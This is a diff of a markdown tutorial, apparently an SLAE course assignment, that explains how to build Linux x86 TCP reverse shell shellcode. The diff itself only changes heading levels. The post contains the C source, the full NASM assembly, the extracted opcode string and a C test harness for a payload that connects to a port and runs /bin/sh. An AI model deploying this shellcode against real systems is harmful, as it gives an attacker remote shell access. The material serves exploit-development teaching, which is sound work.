@@ -14,12 +14,12 @@ Once analysis of the C program is complete, the program will be re-written using
 
 The third section will demonstrate a program written in Python that allows a user to configure an IP address and port number to be used in the Shell_Reverse_TCP shellcode.
 
-### Objectives
+## Objectives
 Create a Shell_Reverse_TCP shellcode that;
 1. Connects to an easily configurable IP address and port number
 2. Executes a shell on a successful connection
 
-### Analysis of Shell_Reverse_TCP.c
+## Analysis of Shell_Reverse_TCP.c
 The following code has been commented in a way that aims to break the program down into distinct sections to be referenced during analysis. If a section of code has already been explained previously, then either a reference to a previous explanation will be made, or the previous explanation will be reused within this post. A brief explanation will be provided for new concepts and/or functions.
 
 ```c
@@ -58,7 +58,7 @@ int main ()
 }
 ```
 
-#### Create a TCP Socket
+### Create a TCP Socket
 `int socket(int domain, int type, int protocol);`
 
 _Note from the author:_ This explanation has been reused from a previous post as the purpose of the function is the same in both cases.
@@ -67,10 +67,10 @@ First, a TCP socket is created using the `socket` function. As described in `man
 
 In this case, the domain argument `AF_INET` specifies the IPv4 communication protocol, the type argument `SOCK_STREAM` specifies the connection-based TCP standard for data exchange, and the protocol argument `0` indicates that the system should select the default protocol number based on the previously specified domain and protocol arguments.
 
-#### Create an IP Address Pointer
+### Create an IP Address Pointer
 A pointer to the IP address of `127.0.0.1` is created which will later be used in the creation of the IP socket address structure `addr` which will ultimately determine where the reverse shell connection will terminate (i.e. the IP address of the remote listening host). The IP address of `127.0.0.1` is used for demonstration purposes, as this IP address is assigned to the loopback `lo` interface of the test system.
 
-#### Create an IP Socket Address Structure
+### Create an IP Socket Address Structure
 This process is very similar to the process outlined in the analysis of the TCP bind shell C code, however there are a couple of important differences. In the case of the TCP reverse shell, the `addr` IP socket address structure is created for later use with the `connect` function. As further explained in `man 7 ip`, an IP socket address is defined as a combination of an IP interface address and a 16-bit (2 byte) port number. The man page also states that `sin_family` is always set to `AF_INET`, that `sin_port` defines a port number in network byte order. 
 
 In the code above, the `htons` function converts the unsigned short integer `4444` from host byte order to network byte which is the format expected for `sin_port`. As detailed in `man inet_aton`, the `inet_aton` function is used to convert and store the IPv4 numbers-and-dots IP address of `127.0.0.1` into binary form (in network byte order). The first argument expected by `inet_aton` is a numbers-and-dots IPv4 address and the second argument is a pointer to a structure where the binary network byte order form of the IPv4 address should be stored (`sin_addr`, as expected by the `sockaddr` structure, in this case).
@@ -94,28 +94,28 @@ struct sockaddr_in {
 #endif
 ```
 
-#### Connect TCP Socket to IP Socket Address Structure
+### Connect TCP Socket to IP Socket Address Structure
 `int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`
 
 As detailed in `man connect`, the `connect` function is used to connect a socket specified by its file descriptor `sockfd` to an address specified by `addr`. In this case, `sockfd` is the file descriptor returned by the previous call to `socket` and `addr` is the IP socket address structure defined earlier.
 
 As `sockfd` was initialized with the type `SOCK_STREAM`, the `connect` function attempts to connect the local `sockfd` to the remote socket that is bound to the remote system's IP address and port. The call to `connect` in a TCP reverse shell compared to the calls to `bind`, `listen` and `accept` in a TCP bind shell highlight a major difference between the two shell types.
 
-#### Direct Connection Socket Output
+### Direct Connection Socket Output
 `int dup2(int oldfd, int newfd);`
 
 _Note from the author:_ This explanataion is largely the same as an explanation from a previous post, however it should be noted that in the case of a TCP reverse shell, the first argument passed to `dup2` is the socket file descriptor `sockfd` as returned by `socket` as opposed to the `connfd` file descriptor as returned by `accept` in a TCP bind shell.
 
 Next, a `for` loop is used to iterate over the `dup2` function three times, passing the values of `i = 0`, `i = 1`, and `i = 2` as the second argument expected by `dup2` during each respective iteration. The purpose of this is to direct data from the socket file descriptor `sockfd` which is passed as the first argument to `dup2` for each `for` loop iteration to `STDIN` (integer file descriptor `0`), `STDOUT` (integer file descriptor `1`), and `STDERROR` (integer file descriptor `2`).
 
-#### Execute Program
+### Execute Program
 `int execve(const char *pathname, char *const argv[], char *const envp[]);`
 
 _Note from the author:_ This explanation has been reused from a previous post as the purpose of the function is the same in both cases. One minor difference that will be reiterated here is that in a TCP reverse shell, `execve` is called after a connection to a remote system is made. In a TCP bind shell, `execve` is called after the system on which the code is running accepts a connection on a bound and listening address and port.
 
 Finally, the `execve` function is called. The `execve` function executes the program pointed to by the first argument, `filename`. The second argument, `argv`, is a pointer to an array of argument strings that should be passed to `filename`. The final argument expected by `execve` is a pointer to an array of strings that are passed as environment to the newly-executed `filename` program. The `argv` and `envp` arguments must include a NULL pointer at the end of the array. Additionally, `argv[0]` should contain the filename assosicated with the program being executed (i.e. `filename`). In the analyzed program, the `/bin/sh` file will be executed with no additional arguments or environments being passed.
 
-### From C to Shellcode
+## From C to Shellcode
 Now that the analysis of the TCP reverse shell C code is complete, it is easier to determine which system calls are necessary to create a functional TCP reverse shell in assembly. From analysis, it is clear that system calls will need to be made to the following functions in the following order:
 1. `socket`
 2. `connect`
@@ -126,7 +126,7 @@ The mechanics of system calls in Linux x86 assembly were explained in an earlier
 
 In the sections following, the assembly code used to prepare for and execute the functions listed above will be explained. As the details of these functions and their purpose within a TCP reverse shell program were previously explained during the analysis of the C code, the following sections will focus on the assembly code used to prepare for and excute each function rather than on the purpose of the function within the program. Some of the assembly used for the TCP reverse shell is similar to the assembly used within the TCP bind shell explained in a previous post. These sections will be explained in less detail, as they have already been explained previously. The assembly code will come first, followed by the explanation of the code.
 
-#### Clear Registers
+### Clear Registers
 The assembly code starts by clearing the registers. This is done to prevent any inadvertent values from being passed as incorrect arguments to system calls. 
 
 ```nasm
@@ -139,7 +139,7 @@ Three registers are cleared using the two instructions shown above. First, the `
 
 Note that the `ECX` register is not cleared. This is because later in the code, a 32-bit value is moved into `ECX` and that move is the first time the register is used. Therefore, any value in `ECX` will be replaced and overwritten by new, 32-bit value.
 
-#### Socketcall System Call Explained
+### Socketcall System Call Explained
 The `socketcall` system call is used in the TCP reverse shell for the first two functions mentioned above. As explained in a previous post, `socketcall` expects two arguments.
 
 ```shell
@@ -166,7 +166,7 @@ root@kali:~/workspace/SLAE# grep socketcall /usr/include/x86_64-linux-gnu/asm/un
 #define __NR_socketcall 102
 ```
 
-#### Socketcall: Socket
+### Socketcall: Socket
 _Note from the author:_ This section is almost exactly the same as the section of the same name in the discussion of the TCP bind shell. Additional explanation is included here regarding where `sockfd` is stored and the reasons why.
 
 The first function from the analyzed C code that will be converted to assembly is the call to `socket`. The `socket` function expects three arguments as outlined in the analysis of the C code. The `socketcall` function expects the three arguments to `socket` to be passed as a pointer to its second argument. The `ESP` register stores the current memory address of the stack and therefore inherently acts as a pointer to an area of memory. 
@@ -201,7 +201,7 @@ mov ebx, eax
 
 After an `INT 0x80`, the return value of the called function is stored in `EAX`. The last instruction shown above stores the file descriptor returned by `socket` (called `sockfd` in the C program) in `EBX` for future use. Note that the value returned for `sockfd` happens to be `0x3` in this case, which is later passed as the function number to `socketcall` for `connect` and then as `sockfd` to `dup2` as its first argument. The value of `0x3` remains in the `EBX` register until the call to `execve`.
 
-#### Create an IP Address Pointer
+### Create an IP Address Pointer
 Now, the IP address of `127.0.0.1` is created for use in the IP socket address structure `addr` as the value pointed to by `sin_addr`. The 32-bit (4 byte) IP address can be represented in hexadecimal using the following bit of Python.
 
 ```python
@@ -235,7 +235,7 @@ In the case of `0xffffffff`, all 32 binary bits are set to `1`. For `0xfeffff80`
 
 If `0x1000007f` represents the black within the `0x00000000` white of yin, then `0xfeffff80` is reflected as the equal-yet-opposite white within the `0xffffffff` black of yang. `0x1000007f` and `0xfeffff80` are opposite and complementary to one another as `0x00000000` and `0xffffffff` are. 
 
-#### IP Socket Address Structure
+### IP Socket Address Structure
 _Note from the author:_ This section is identical to the section of the same name from the explanation of a TCP bind shell with the exception of the `127.0.0.1` address pushed through `ECX` as opposed to the `0.0.0.0` address pushed through `EDX`.
 
 Next, the IP socket address structure defined in the C program as `addr` is saved in memory. To accomplish this, the items will be stored on the stack using the `PUSH` instruction. 
@@ -251,7 +251,7 @@ mov ecx, esp        ; pointer to struct sockaddr_in addr;
 
 First, the items are pushed to the stack in reverse order. Then, the memory address pointing to the item last pushed to the stack (which is contained in the `ESP` register) is moved to the `ECX` register to later be used as the second argument for `connect`.
 
-#### Socketcall: Connect System Call
+### Socketcall: Connect System Call
 With the memory address of the defined IP socket address structure stored in `ECX` and the socket file descriptor (`sockfd`) stored in `EBX`, the call to `connect` can now be prepared and executed. As the `socketcall` system call will again be used to call `connect`, the process for preparing the arguments for `connect` and for `socketcall` will be similar to the process outlined in the "Socketcall: Socket" section.
 
 ```nasm
@@ -274,7 +274,7 @@ int 0x80            ; returns 0 in eax
 
 Next, the arguments for `socketcall` are prepared, this time with the intention of executing `connect`. As with the previous `socketcall`, the second argument is passed via the `ECX` register. To reiterate, as the three arguments expected by `connect` are stored on the stack, the `ESP` register will contain the memory address of where the first of these three arguments begins. Therefore, after the `MOV` instruction, the `ECX` register contains the memory address of where the three arguments for `connect` are stored. Recall from the "Socketcall: Socket" section that the value `0x3` is still stored in `EBX`. The value of `3` is the function number for `connect` and is passed to `socketcall` through `EBX` as the first argument. The system call number `0x66` (decimal `102`) is moved to the `AL` register before the sofware interrupt occurs and the system call is executed.
 
-#### Dup2 System Call
+### Dup2 System Call
 _Note from the author:_ Once again, this section is very similar to the "Dup2 System Call" section from the TCP bind shell explanation. The main difference is that in a TCP reverse shell, the file descriptor passed as the first argument to `dup2` each time is the socket file descriptor `sockfd` returned by `socket` ass opposed to the a connection file descriptor `confd` returned by`accept`.
 
 The next system call required in the TCP reverse shell is `dup2` which is assigned the system call number decimal `63` in the `unistd_32.h` file.
@@ -306,7 +306,7 @@ For the first call to `dup2`, the value of `0` is stored in the `ECX` register w
 
 This general process is repeated two more times passing the values of `1` and `2` to the function's second argument each successive time. Note that the `sockfd` file descriptor remains in `EBX` throughout.
 
-#### Execve System Call
+### Execve System Call
 _Note from the author:_ The purpose of `execve` is the same in both TCP reverse and TCP bind shells. After further experimentation, however, it was discovered the value of `NULL` can be passed for the second and third arguments of `execve`. This is to say that `NULL` terminated pointers do not need to be created using `PUSH` instructions, as was demonstrated in the TCP bind shell cpde. In this case, `NULL` is passed via `ECX` and `EDX` for the second and third arguments of `execve`.
 
 The final step is a system call to `execve` in order to execute `/bin/sh`. From `unistd_32.h` the system call number for `execve` is decimal `11`.
@@ -332,7 +332,7 @@ int 0x80
 
 To prepare the three arguments for `execve`, the `/bin/sh` string is first stored on the stack using `PUSH` instructions. The first `PUSH` shown in the code above serves to `NULL` terminate the `/bin/sh` string. Note that `EDX` is `NULL` and will be passed as the third argument to `execve`. Next, the `/bin/sh` string itself is pushed to the stack. Then, the empty `EDX` register value is moved to `ECX` which will be passed as the second argument to `execve`. At this point, `ESP` stores the memory address of where the `/bin/sh` string is stored, and hence this memory address is moved to `EBX` which will be passed as the first argument for `execve`. The `execve` system call number is moved into `AL` before the software interrupt occurs.
 
-### Completed Assembly Program
+## Completed Assembly Program
 Shown below is the assembly program described above in its entirety. Some of the comments from the code above have been removed. The fully commented version of the code can be found on GitHub.
 
 ```nasm
@@ -401,8 +401,8 @@ _start:
     int 0x80
 ```
 
-### Compile & Test
-#### Testing Assembly
+## Compile & Test
+### Testing Assembly
 The TCP reverse shell assembly code can be compiled and tested in the following manner. The commands used were run on 64-bit Kali Linux. To start, the code should be assembled with `/usr/bin/nasm` as shown below. As the program is written in x86 assembly, the `elf32` file type is specified using the `-f` flag.
 
 ```shell
@@ -448,7 +448,7 @@ shell_reverse_tcp.o
 
 Success!
 
-#### Examining The Shellcode
+### Examining The Shellcode
 As `shell_bind_tcp` has been compiled and linked and is functioning as a standalone program, it should now be disassembled into opcodes using `/usr/bin/objdump` for further examination. Using the command shown below, the operation codes can be examined for any `NULL` characters. The output has been truncated to conserve space.
 
 ```shell
@@ -479,7 +479,7 @@ Disassembly of section .text:
  \x31\xdb\xf7\xe3\x52\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\xbf\xff\xff\xff\xff\xb9\x80\xff\xff\xfe\x31\xf9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x89\xd1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80
  ```
 
-#### Testing The Shellcode
+### Testing The Shellcode
 To confirm that the shellcode will work within the context of a C program, the shellcode can be placed in a test program (titled `sc_test.c` in this example) written in C, as shown below.
 
 ```c
@@ -527,7 +527,7 @@ root@kali:~/workspace/SLAE/assignments/0x02# ./sc_test
 Shellcode Length: 88
 ```
 
-### Wrapper Program for IP & Port Configuration
+## Wrapper Program for IP & Port Configuration
 The remote IP address and the remote port to be included in the TCP reverse shell shellcode can be configured using the Python program explained below. The wrapper program configured in the last section of the previous post has been modified to include reverse shell shellcode, and the functionality to configure a remote IP address and port for the target system to connect to. The output below shows the usage options of the program.
 
 ```shell
